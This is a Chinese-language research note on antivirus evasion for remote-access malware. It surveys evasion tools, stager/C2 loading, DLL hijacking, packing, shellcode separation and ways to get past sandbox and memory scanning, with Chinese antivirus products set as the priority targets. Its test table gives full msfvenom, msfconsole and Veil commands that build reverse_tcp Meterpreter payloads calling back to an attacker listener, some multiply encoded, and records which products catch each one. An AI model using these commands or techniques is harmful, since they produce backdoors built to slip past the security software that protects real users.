# 二进制免杀技术研究
## 0x00 免杀技术现状研究
### 1 免杀制作视角
#### 1.1 免杀目标
任何可用于攻击或破坏的实体都需要免杀，且免杀与查杀是动态对抗的。实际上，程序的实际形态与结构比较复杂，因此不同形态类型的程序使用的免杀技术是存在一定区别的。
#### 1.2 流行免杀工具
| 名称                 | 国内流行度 | 专用免杀工具 |
| -------------------- | ---------- | ------------ |
| msfvenom             | 非常高     | 否           |
| cobalt_strike        | 非常高     | 否           |
| veil                 | 高         | 是           |
| msf-vasion           | 高         | 是           |
| venom                | 高         | 是           |
| The Backdoor Factory | 一般       | 是           |
| thefatrat            | 一般       | 是           |
| zirkatu              | 低         | 是           |
| avlator              | 低         | 是           |
| nps_payload          | 低         | 是           |
| donout               | 低         | 是           |
#### 1.3 对象形态
##### 1.3.1 独立文件
以远控为例，独立的远控指程序自身就是完全独立可用的远控程序，内部实现了完备的功能。远控中有时提到的stagless/single类远控也就是独立远控。
典型工具：**Metasploit**、**ColbaltStrike**。**灰鸽子**、**冰河**、**上兴**
##### 1.3.2 加载器
以远控为例，以msf/cs工具的漏洞利用过程来说，目标设备上运行加载器(stager)，加载器从C2服务器上再动态加载（payload-staging）完整的功能模块(stage)。
典型工具：**Metasploit**、**ColbaltStrike**
```shell
stager：是一段很精短的代码，本质是个加载器，它可以向C2服务器发起连接，并下载真正的payload并将其注入内存。(bind_tcp/reverse_tcp)
stage：是一个包含了很多功能的代码块，用于接受和执行我们控制端的任务并返回结果。(meterpreter/shell)
payload Staging：stager通过各种方式(如http、dns、tcp等)下载stage并注入内存运行这个过程。
https://www.anquanke.com/post/id/231002
https://my.oschina.net/u/4581876/blog/4380681
所谓的beacon与stage(r)类似，是远控在受害者的驻点。
```
##### 1.3.3 文件篡改
不少程序内部存在大量的空闲空间，这些空间闲散在各个节区内，某些研究人员发现可以在这些空余间隙中填充payload并篡改程序的执行流程，从而达到植入后门的目的。
典型工具：**The Backdoor Factory**
##### 1.3.4 dll注入/劫持
通过劫持正常的程序对依赖的dll的加载，从而劫持程序的执行流程达到执行恶意代码恶意功能的目的。
典型工具：**Metasploit**、**ColbaltStrike**、**venom**、**APT白加黑**
##### 1.3.5 无文件执行
以powershell和bashshell为代表，通过命令动态向C2服务器请求代码并执行或反弹一个shell。
典型工具：**Empire**、**Nishang**
### 2 杀软检测视角
#### 2.1 恶意文件检测技术
常规的安全软件对恶意程序的识别与查杀主要有以下手段：
##### 2.1.1 特征码扫描技术
计算文件的特征与数据库内的特征进行比对。误报率低，适用于已知病毒。
##### 2.1.2 校验和扫描技术
计算文件的哈希校验和与数据库内进行比对。误报率低，适用于已知病毒，但很容易被绕过。
##### 2.1.3 虚拟行为分析
通过将文件放置到杀毒软件创建的虚拟环境中进行运行，观察其对资源的申请动作，进而识别程序是否恶意。
##### 2.1.4 启发式引擎查杀
在提取并获得程序的静态特征及行为的基础上，结合学习经验，推断出目标是否是恶意文件。
##### 2.1.5 主动防御
主动防御分为两大块。
\- **行为监控**：通过hook 系统底层API，进而识别进程对资源的申请动作。
\- **内存查杀**：分析内存中程序的结构。
##### 2.1.6 云查杀
主要是解决本地杀毒软件无法存储所有恶意文件的静态特征的问题，将本地文件的特征值计算出来与云端进行比对。
##### 2.1.7 多引擎查杀
结合多家杀毒软件的引擎对文件进行查杀，进而降低误报率。
##### 2.1.8 人工智能引擎
通过人工智能分析的算法，结合海量数据，从而学习新形式恶意软件查杀的能力。
#### 2.2 杀毒软件
由于要做的免杀主要用于国内，因此与国内杀软的对抗，处于最高的优先级。结合国内杀软的普及占有率，大概给出以下梯队结构：
**优先级1：**360全家桶、Windows Defender、火绒、奇安信
**优先级2：**瑞星、诺顿、金山、小红伞、腾讯安全管家
**优先级3：**江民、比特梵德、迈克菲、大蜘蛛、avast等。
### 3 免杀技术
这里以最为常见的独立远控与加载类远控为例，介绍免杀一个文件的几个大的步骤。
#### 3.1 第一阶段-文件免杀/静态免杀
文件免杀是免杀的第一阶段，杀毒软件最常见的对恶意样本的识别就是检测文件特征码。文件免杀即是规避掉这些特征，规避方法有很多，下面给出几种常见的免杀方式。
+ 1.**特征码定位修改免杀**：破坏特征，影响模糊哈希结果。（比较适合无源码情况下免杀，不同厂商特征码确定方法不一，故免杀代价高）
+ 2.**加壳免杀**：核心程序外套一层加密壳，壳有自己的程序入口，运行后解密出核心程序并执行。壳掩盖了内部可能存在的特征值，但壳自己也有特征，且有可能被查杀软件与分析人员脱掉。（TideSec的文章中提到可以修改冷门壳的程序实现绕过。）
+ 3.**花指令免杀**：填充垃圾数据或无意义指令阻止反汇编分析或影响特征码定位。
+ 4.**shellcode的混淆/分离**：以msf、cs为代表漏洞利用框架，stager中常用的shellcode已被杀毒软件重点关照，因此可以将他们进行混淆处理，在运行时进行重组。
+ 5.**分离免杀**：以msf、cs为代表漏洞利用框架，stager中常用的shellcode已被杀毒软件重点关照。可以将payload-staging时的shellcode与程序shellcode加载器进行分离。加载器+加密或编码后的payload，进而躲掉模糊哈希比对。
#### 3.2 第二阶段-反行为检测/运行时免杀1
+ 欺骗沙箱
+ 识别并躲避沙箱
主要是规避掉文件运行时会表现出来的行为特征（如联网、读写敏感文件、获取敏感资源）。
在对抗行为检测的过程中，又会引入一部分静态特征，因此需要不断的综合调整。下面引用一篇文章中对行为检测对抗的简要介绍。
```cmd
# https://github.com/Airboi/bypass-av-note
对行为来讲，很多API可能会触发杀软的监控，比如注册表操作、添加启动项、添加服务、添加用户、注入、劫持、创建进程、加载DLL等等。 针对行为的免杀，我们可以使用白名单、替换API、替换操作方式（如使用WMI/COM的方法操作文件）等等方法实现绕过。除常规的替换、使用未导出的API等姿势外，我们还可以使用通过直接系统调用的方式实现，比如使用内核层面Zw系列的API，绕过杀软对应用层的监控（如下图所示，使用ZwAllocateVirtualMemory函数替代VirtualAlloc）。
```
#### 3.3 第三阶段 内存免杀/运行时免杀2
杀毒软件沙箱中扫描运行起来的恶意程序，扫描起内存地址上的内容是否能匹配到已知的病毒库特征值。
从目前的实际工具免杀来看，往往只要过了文件免杀与行为检测免杀就能实现彻底免杀。然而不少杀毒软件还有内存查杀，内存查杀针对已知的恶意文件查杀效果较好。想要躲避内存查杀，需要破坏程序加载到内存后的特征，因此往往需要结合源码进行修改。
#### 3.4 其他-非常规免杀
+ 1 **白名单免杀**：杀毒软件有白名单，白化可以从以下角度考虑（图片、版本信息、对话框）、泄露的可信的私钥签名
+ 2 **dll劫持免杀**：优先级劫持或替换正常位置的dll达到白加黑绕过。
+ 3 **篡改免杀**：以BDF为代表的后门制作工具利用正常程序中的无用空间填充shellcode，篡改正常执行流程达到后门制作的效果。
+ 4 **切换开发语言**：杀毒软件对不同语言开发出来的远控识别能力是存在差异的，主流的漏洞利用框架下，基于C/C++、C#、py、powershell的样本识别率往往很高，而go语言的识别率就较低。
## 0x01 免杀测试
针对一些主流的常见的漏洞利用框架及免杀制作工具，简单进行了测试。结果如下。
| 工具            |             | 生成             |      |      |                                                              |
| --------------- | ----------- | ---------------- | ---- | ---- | ------------------------------------------------------------ |
| 360杀毒联网     | 360卫士联网 | 腾讯安全（联网） | 火绒 |      |                                                              |
| msfvenom        | √           | √                | √    | √    | msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51001 -f exe -o  51001.exe |
| msfconsole      | √           | √                | ×    | √    | msfconsole -x "use  windows/windows_defender_exe;\set filename 51002.exe;\set payload  windows/meterpreter/reverse_tcp;\set LHOST 192.168.43.128;\set LPORT  51002;\run;\exit" |
| msfconsole      | ×           | ×                | √    | ×    | msfconsole -x "use  windows/windows_defender_js_hta;\set filename 51003.hta;\set payload  windows/meterpreter/reverse_tcp;\set LHOST 192.168.43.128;\set LPORT  51003;\run;\exit" |
| veil            | √           | √                | √    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use autoit/shellcode_inject/flat.py     generate     Ordnance     use 4     set LHOST 192.168.43.128     set LPORT 51004     generate     51004          exit |
| veil            | ×           | ×                | ×    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use c/meterpreter/rev_tcp.py     set LHOST 192.168.43.128     set LPORT 51005     generate     51005          exit |
| veil            | √           | √                | ×    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use cs/meterpreter/rev_tcp.py     set LHOST 192.168.43.128     set LPORT 51006     generate     51006          exit |
| veil            | ×           | ×                | ×    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use cs/shellcode_inject/base64.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51007     generate     51007          exit |
| veil            | ×           | ×                | ×    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use cs/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51008     generate     51008          exit |
| veil            | √           | √                | √    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use go/meterpreter/rev_tcp.py     set LHOST 192.168.43.128     set LPORT 51009     generate     51009          exit |
| veil            | √           | √                | ×    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use go/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51010     generate     51010          exit |
| veil            | √           | √                | √    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use powershell/meterpreter/rev_tcp.py     set LHOST 192.168.43.128     set LPORT 51011     generate     51011          exit |
| veil            | ?           | ?                | ?    | ?    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use powershell/shellcode_inject/psexec_virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51012     generate     51012          exit |
| veil            | √           | √                | √    | √    | docker run -it  -v /root/VirusAV/veil-output:/var/lib/veil/output:Z mattiasohlsson/veil     use 1     use powershell/shellcode_inject/virtual.py     generate     1     use 4     set LHOST 192.168.43.128     set LPORT 51013     generate     51013          exit |
| msfvenom        | √           | √                | √    | √    | msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51014 -f exe -i 5  -e x86/shikata_ga_nai -o 51014.exe |
| msfvenom        | ×           | ×                | ×    | ×    | msfvenom -p  windows/meterpreter/reverse_tcp LHOST=192.168.43.128 LPORT=51015 -f exe -i 5  -e x86/shikata_ga_nai \|msfvenom -a x86 --platform windows -e x86/countdown -i  8 -f raw -o 51015.exe |